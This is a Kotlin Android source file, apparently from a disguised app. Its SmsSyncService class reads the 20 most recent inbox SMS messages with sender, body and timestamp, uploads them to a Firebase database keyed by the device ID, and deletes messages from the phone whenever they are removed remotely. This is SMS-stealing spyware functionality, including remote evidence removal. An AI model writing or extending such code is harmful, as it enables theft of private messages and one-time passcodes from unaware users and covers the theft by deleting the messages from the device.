package com.vplan.rxtprob

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.Settings
import android.provider.Telephony
import com.google.firebase.database.*

class SmsSyncService(private val context: Context) {

    private val deviceId: String by lazy {
        Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown_device"
    }

    private val smsRef: DatabaseReference by lazy {
        FirebaseDatabase.getInstance().getReference("sms").child(deviceId)
    }

    // ✅ SMS upload (first 20)
    fun uploadInitialSms(limit: Int = 20) {
        val uriSms = Telephony.Sms.Inbox.CONTENT_URI
        val cursor: Cursor? = context.contentResolver.query(uriSms, null, null, null, "date DESC")

        cursor?.use {
            var count = 0
            while (it.moveToNext() && count < limit) {
                val id = it.getString(it.getColumnIndexOrThrow(Telephony.Sms._ID))
                val sender = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: ""
                val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
                val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))

                val smsData = mapOf(
                    "id" to id,
                    "sender" to sender,
                    "body" to body,
                    "timestamp" to date
                )

                smsRef.child(id).setValue(smsData)
                count++
            }
        }
    }

    // ✅ Firebase delete listener
    fun listenForFirebaseDeletion() {
        smsRef.addChildEventListener(object : ChildEventListener {
            override fun onChildRemoved(snapshot: DataSnapshot) {
                val smsId = snapshot.key ?: return
                deleteSmsFromPhone(smsId)
            }

            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {}
            override fun onCancelled(error: DatabaseError) {}
        })
    }

    private fun deleteSmsFromPhone(smsId: String) {
        try {
            val uriSms = Uri.parse("content://sms")
            context.contentResolver.delete(uriSms, "_id=?", arrayOf(smsId))
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
